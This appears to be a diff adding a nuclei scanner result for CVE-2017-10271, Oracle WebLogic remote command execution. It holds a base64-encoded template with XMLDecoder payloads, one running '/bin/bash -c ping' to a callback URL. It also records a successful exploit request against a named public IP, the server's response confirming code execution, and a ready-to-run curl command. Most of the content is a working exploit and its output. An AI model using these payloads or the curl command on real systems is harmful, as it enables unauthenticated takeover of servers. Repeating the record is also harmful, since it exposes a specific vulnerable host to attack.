@@ -1,0 +1,66 @@
+[
+  {
+    "template": "http/cves/2017/CVE-2017-10271.yaml",
+    "template-url": "https://cloud.projectdiscovery.io/public/CVE-2017-10271",
+    "template-id": "CVE-2017-10271",
+    "template-path": "/root/nuclei-templates/http/cves/2017/CVE-2017-10271.yaml",
+    "template-encoded": "aWQ6IENWRS0yMDE3LTEwMjcxCgppbmZvOgogIG5hbWU6IE9yYWNsZSBXZWJMb2dpYyBTZXJ2ZXIgLSBSZW1vdGUgQ29tbWFuZCBFeGVjdXRpb24KICBhdXRob3I6IGRyX3NldCxJbU5pZ2h0bWFyZWUsdHJ1ZTEzCiAgc2V2ZXJpdHk6IGhpZ2gKICBkZXNjcmlwdGlvbjogfAogICAgVGhlIE9yYWNsZSBXZWJMb2dpYyBTZXJ2ZXIgY29tcG9uZW50IG9mIE9yYWNsZSBGdXNpb24gTWlkZGxld2FyZSAoc3ViY29tcG9uZW50IC0gV0xTIFNlY3VyaXR5KSBpcyBzdXNjZXB0aWJsZSB0byByZW1vdGUgY29tbWFuZCBleGVjdXRpb24uIFN1cHBvcnRlZCB2ZXJzaW9ucyB0aGF0IGFyZSBhZmZlY3RlZCBhcmUgMTAuMy42LjAuMCwgMTIuMS4zLjAuMCwgMTIuMi4xLjEuMCBhbmQgMTIuMi4xLjIuMC4gVGhpcyBlYXNpbHkgZXhwbG9pdGFibGUgdnVsbmVyYWJpbGl0eSBhbGxvd3MgdW5hdXRoZW50aWNhdGVkIGF0dGFja2VycyB3aXRoIG5ldHdvcmsgYWNjZXNzIHZpYSBUMyB0byBjb21wcm9taXNlIE9yYWNsZSBXZWJMb2dpYyBTZXJ2ZXIuCiAgcmVtZWRpYXRpb246IHwKICAgIEFwcGx5IHRoZSBsYXRlc3Qgc2VjdXJpdHkgcGF0Y2hlcyBwcm92aWRlZCBieSBPcmFjbGUgdG8gZml4IHRoaXMgdnVsbmVyYWJpbGl0eS4gQWRkaXRpb25hbGx5LCByZXN0cmljdCBuZXR3b3JrIGFjY2VzcyB0byB0aGUgV2ViTG9naWMgc2VydmVyIGFuZCBpbXBsZW1lbnQgc3Ryb25nIGF1dGhlbnRpY2F0aW9uIG1lY2hhbmlzbXMuCiAgcmVmZXJlbmNlOgogICAgLSBodHRwczovL2dpdGh1Yi5jb20vdnVsaHViL3Z1bGh1Yi90cmVlL2ZkYTQ3Yjk3YzdkMjgwOTY2MGE0NDcxNTM5Y2QwZTZkYmY4ZmFjOGMvd2VibG9naWMvQ1ZFLTIwMTctMTAyNzEKICAgIC0gaHR0cHM6Ly9naXRodWIuY29tL1N1cGVySGFja2VyLWxpdWFuL2N2ZS0yMDE3LTEwMjcxLXBvYwogICAgLSBodHRwOi8vd3d3Lm9yYWNsZS5jb20vdGVjaG5ldHdvcmsvc2VjdXJpdHktYWR2aXNvcnkvY3B1b2N0MjAxNy0zMjM2NjI2Lmh0bWwKICAgIC0gaHR0cHM6Ly9udmQubmlzdC5nb3YvdnVsbi9kZXRhaWwvQ1ZFLTIwMTctMTAyNzEKICAgIC0gaHR0cDovL3d3dy5zZWN1cml0eXRyYWNrZXIuY29tL2lkLzEwMzk2MDgKICBjbGFzc2lmaWNhdGlvbjoKICAgIGN2c3MtbWV0cmljczogQ1ZTUzozLjAvQVY6Ti9BQzpML1BSOk4vVUk6Ti9TOlUvQzpOL0k6Ti9BOkgKICAgIGN2c3Mtc2NvcmU6IDcuNQogICAgY3ZlLWlkOiBDVkUtMjAxNy0xMDI3MQogICAgZXBzcy1zY29yZTogMC45NzQzOAogICAgZXBzcy1wZXJjZW50aWxlOiAwLjk5OTM2CiAgICBjcGU6IGNwZToyLjM6YTpvcmFjbGU6d2VibG9naWNfc2VydmVyOjEwLjMuNi4wLjA6KjoqOio6KjoqOio6KgogIG1ldGFkYXRhOgogICAgbWF4LXJlcXVlc3Q6IDIKICAgIHZlbmRvcjogb3JhY2xlCiAgICBwcm9kdWN0OiB3ZWJsb2dpY19zZXJ2ZXIKICB0YWdzOiB3ZWJsb2dpYyxvYXN0LGtldix2dWxodWIsY3ZlLGN2ZTIwMTcscmNlLG9yYWNsZQoKaHR0cDoKICAtIHJhdzoKICAgICAgLSB8CiAgICAgICAgUE9TVCAvd2xzLXdzYXQvQ29vcmRpbmF0b3JQb3J0VHlwZSBIVFRQLzEuMQogICAgICAgIEhvc3Q6IHt7SG9zdG5hbWV9fQogICAgICAgIEFjY2VwdDogKi8qCiAgICAgICAgQWNjZXB0LUxhbmd1YWdlOiBlbgogICAgICAgIENvbnRlbnQtVHlwZTogdGV4dC94bWwKCiAgICAgICAgPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KICAgICAgICA8c29hcGVudjpFbnZlbG9wZQogICAgICAgICAgICB4bWxuczpzb2FwZW52PSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VudmVsb3BlLyI+CiAgICAgICAgICAgIDxzb2FwZW52OkhlYWRlcj4KICAgICAgICAgICAgICAgIDx3b3JrOldvcmtDb250ZXh0CiAgICAgICAgICAgICAgICAgICAgeG1sbnM6d29yaz0iaHR0cDovL2JlYS5jb20vMjAwNC8wNi9zb2FwL3dvcmthcmVhLyI+CiAgICAgICAgICAgICAgICAgICAgPGphdmEgdmVyc2lvbj0iMS40LjAiIGNsYXNzPSJqYXZhLmJlYW5zLlhNTERlY29kZXIiPgogICAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhcnJheSBjbGFzcz0iamF2YS5sYW5nLlN0cmluZyIgbGVuZ3RoPSIzIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBpbmRleD0iMCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzdHJpbmc+L2Jpbi9iYXNoPC9zdHJpbmc+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC92b2lkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx2b2lkIGluZGV4PSIxIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHN0cmluZz4tYzwvc3RyaW5nPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBpbmRleD0iMiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzdHJpbmc+cGluZyAtYyAxIHt7aW50ZXJhY3RzaC11cmx9fTwvc3RyaW5nPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYXJyYXk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBtZXRob2Q9InN0YXJ0Ii8+PC92b2lkPgogICAgICAgICAgICAgICAgICAgIDwvamF2YT4KICAgICAgICAgICAgICAgIDwvd29yazpXb3JrQ29udGV4dD4KICAgICAgICAgICAgPC9zb2FwZW52OkhlYWRlcj4KICAgICAgICAgICAgPHNvYXBlbnY6Qm9keS8+CiAgICAgICAgPC9zb2FwZW52OkVudmVsb3BlPgogICAgICAtIHwKICAgICAgICBQT1NUIC93bHMtd3NhdC9Db29yZGluYXRvclBvcnRUeXBlIEhUVFAvMS4xCiAgICAgICAgSG9zdDoge3tIb3N0bmFtZX19CiAgICAgICAgQWNjZXB0OiAqLyoKICAgICAgICBBY2NlcHQtTGFuZ3VhZ2U6IGVuCiAgICAgICAgQ29udGVudC1UeXBlOiB0ZXh0L3htbAoKICAgICAgICA8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/PgogICAgICAgICAgPHNvYXBlbnY6RW52ZWxvcGUgeG1sbnM6c29hcGVudj0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvc29hcC9lbnZlbG9wZS8iPgogICAgICAgICAgICAgIDxzb2FwZW52OkhlYWRlcj4KICAgICAgICAgICAgICAgICAgPHdvcms6V29ya0NvbnRleHQgeG1sbnM6d29yaz0iaHR0cDovL2JlYS5jb20vMjAwNC8wNi9zb2FwL3dvcmthcmVhLyI+CiAgICAgICAgICAgICAgICAgICAgICA8amF2YT4KICAgICAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBjbGFzcz0iamF2YS5sYW5nLlRocmVhZCIgbWV0aG9kPSJjdXJyZW50VGhyZWFkIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHZvaWQgbWV0aG9kPSJnZXRDdXJyZW50V29yayI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBtZXRob2Q9ImdldFJlc3BvbnNlIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBtZXRob2Q9ImdldFNlcnZsZXRPdXRwdXRTdHJlYW0iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBtZXRob2Q9ImZsdXNoIi8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC92b2lkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx2b2lkIG1ldGhvZD0iZ2V0V3JpdGVyIj48dm9pZCBtZXRob2Q9IndyaXRlIj48c3RyaW5nPjJaaTEwanhIM3dHR0pFQ3B5RHhMWTRzcjB3cjwvc3RyaW5nPjwvdm9pZD48L3ZvaWQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgICAgICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgICAgICAgICAgICA8L2phdmE+CiAgICAgICAgICAgICAgICAgIDwvd29yazpXb3JrQ29udGV4dD4KICAgICAgICAgICAgICA8L3NvYXBlbnY6SGVhZGVyPgogICAgICAgICAgICAgIDxzb2FwZW52OkJvZHkvPgogICAgICAgIDwvc29hcGVudjpFbnZlbG9wZT4KCiAgICBzdG9wLWF0LWZpcnN0LW1hdGNoOiB0cnVlCgogICAgbWF0Y2hlcnMtY29uZGl0aW9uOiBvcgogICAgbWF0Y2hlcnM6CiAgICAgIC0gdHlwZTogZHNsCiAgICAgICAgZHNsOgogICAgICAgICAgLSByZWdleCgiPGZhdWx0c3RyaW5nPmphdmEubGFuZy5Qcm9jZXNzQnVpbGRlciB8fCA8ZmF1bHRzdHJpbmc+MCIsIGJvZHkpCiAgICAgICAgICAtIGNvbnRhaW5zKGludGVyYWN0c2hfcHJvdG9jb2wsICJkbnMiKQogICAgICAgICAgLSBzdGF0dXNfY29kZSA9PSA1MDAKICAgICAgICBjb25kaXRpb246IGFuZAoKICAgICAgLSB0eXBlOiBkc2wKICAgICAgICBkc2w6CiAgICAgICAgICAtIGJvZHkgPT0gIjJaaTEwanhIM3dHR0pFQ3B5RHhMWTRzcjB3ciIKICAgICAgICAgIC0gc3RhdHVzX2NvZGUgPT0gMjAwCiAgICAgICAgY29uZGl0aW9uOiBhbmQKCiMgZGlnZXN0OiA0YjBhMDA0ODMwNDYwMjIxMDBiYjk3NmRlYzA4NzU1ZDIyYjM4NzcyYmM5MzA5YmM5NDI1NzIwY2EyZWE5YmRjYTJjODhmZWY4YTY1NzRjNTY0MDIyMTAwYzkzMjg0ZDU2YWJlNmUzNWFlNDUzY2U1ODBmNzY1OGY0MGM2MTRiNzg2ZGQwMzAzOGVhOGIzODdhZmMyM2M5MTo5MjJjNjQ1OTAyMjI3OThiYjc2MWQ1YjZkOGU3Mjk1MAo=",
+    "info": {
+      "name": "Oracle WebLogic Server - Remote Command Execution",
+      "author": [
+        "dr_set",
+        "imnightmaree",
+        "true13"
+      ],
+      "tags": [
+        "weblogic",
+        "oast",
+        "kev",
+        "vulhub",
+        "cve",
+        "cve2017",
+        "rce",
+        "oracle"
+      ],
+      "description": "The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent - WLS Security) is susceptible to remote command execution. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. This easily exploitable vulnerability allows unauthenticated attackers with network access via T3 to compromise Oracle WebLogic Server.\n",
+      "reference": [
+        "https://github.com/vulhub/vulhub/tree/fda47b97c7d2809660a4471539cd0e6dbf8fac8c/weblogic/cve-2017-10271",
+        "https://github.com/superhacker-liuan/cve-2017-10271-poc",
+        "http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html",
+        "https://nvd.nist.gov/vuln/detail/cve-2017-10271",
+        "http://www.securitytracker.com/id/1039608"
+      ],
+      "severity": "high",
+      "metadata": {
+        "max-request": 2,
+        "product": "weblogic_server",
+        "vendor": "oracle"
+      },
+      "classification": {
+        "cve-id": [
+          "cve-2017-10271"
+        ],
+        "cwe-id": null,
+        "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "cvss-score": 7.5,
+        "epss-score": 0.97438,
+        "epss-percentile": 0.99936,
+        "cpe": "cpe:2.3:a:oracle:weblogic_server:10.3.6.0.0:*:*:*:*:*:*:*"
+      },
+      "remediation": "Apply the latest security patches provided by Oracle to fix this vulnerability. Additionally, restrict network access to the WebLogic server and implement strong authentication mechanisms.\n"
+    },
+    "type": "http",
+    "host": "8.217.7.168:7001",
+    "port": "7001",
+    "scheme": "http",
+    "url": "http://8.217.7.168:7001/",
+    "path": "/",
+    "matched-at": "http://8.217.7.168:7001/wls-wsat/CoordinatorPortType",
+    "request": "POST /wls-wsat/CoordinatorPortType HTTP/1.1\r\nHost: 8.217.7.168:7001\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\r\nConnection: close\r\nContent-Length: 947\r\nAccept: */*\r\nAccept-Language: en\r\nContent-Type: text/xml\r\nAccept-Encoding: gzip\r\n\r\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\r\n  \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\r\n      \u003csoapenv:Header\u003e\r\n          \u003cwork:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"\u003e\r\n              \u003cjava\u003e\r\n                  \u003cvoid class=\"java.lang.Thread\" method=\"currentThread\"\u003e\r\n                      \u003cvoid method=\"getCurrentWork\"\u003e\r\n                          \u003cvoid method=\"getResponse\"\u003e\r\n                              \u003cvoid method=\"getServletOutputStream\"\u003e\r\n                                  \u003cvoid method=\"flush\"/\u003e\r\n                              \u003c/void\u003e\r\n                              \u003cvoid method=\"getWriter\"\u003e\u003cvoid method=\"write\"\u003e\u003cstring\u003e2Zi10jxH3wGGJECpyDxLY4sr0wr\u003c/string\u003e\u003c/void\u003e\u003c/void\u003e\r\n                          \u003c/void\u003e\r\n                      \u003c/void\u003e\r\n                  \u003c/void\u003e\r\n              \u003c/java\u003e\r\n          \u003c/work:WorkContext\u003e\r\n      \u003c/soapenv:Header\u003e\r\n      \u003csoapenv:Body/\u003e\r\n\u003c/soapenv:Envelope\u003e",
+    "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nDate: Mon, 18 Dec 2023 08:57:44 GMT\r\nX-Powered-By: Servlet/2.5 JSP/2.1\r\n\r\n2Zi10jxH3wGGJECpyDxLY4sr0wr",
+    "ip": "8.217.7.168",
+    "timestamp": "2023-12-18T16:57:44.957553979+08:00",
+    "curl-command": "curl -X 'POST' -d '\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\r\n  \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\r\n      \u003csoapenv:Header\u003e\r\n          \u003cwork:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"\u003e\r\n              \u003cjava\u003e\r\n                  \u003cvoid class=\"java.lang.Thread\" method=\"currentThread\"\u003e\r\n                      \u003cvoid method=\"getCurrentWork\"\u003e\r\n                          \u003cvoid method=\"getResponse\"\u003e\r\n                              \u003cvoid method=\"getServletOutputStream\"\u003e\r\n                                  \u003cvoid method=\"flush\"/\u003e\r\n                              \u003c/void\u003e\r\n                              \u003cvoid method=\"getWriter\"\u003e\u003cvoid method=\"write\"\u003e\u003cstring\u003e2Zi10jxH3wGGJECpyDxLY4sr0wr\u003c/string\u003e\u003c/void\u003e\u003c/void\u003e\r\n                          \u003c/void\u003e\r\n                      \u003c/void\u003e\r\n                  \u003c/void\u003e\r\n              \u003c/java\u003e\r\n          \u003c/work:WorkContext\u003e\r\n      \u003c/soapenv:Header\u003e\r\n      \u003csoapenv:Body/\u003e\r\n\u003c/soapenv:Envelope\u003e' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Content-Type: text/xml' -H 'Host: 8.217.7.168:7001' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'http://8.217.7.168:7001/wls-wsat/CoordinatorPortType'",
+    "matcher-status": true
+  }
+]
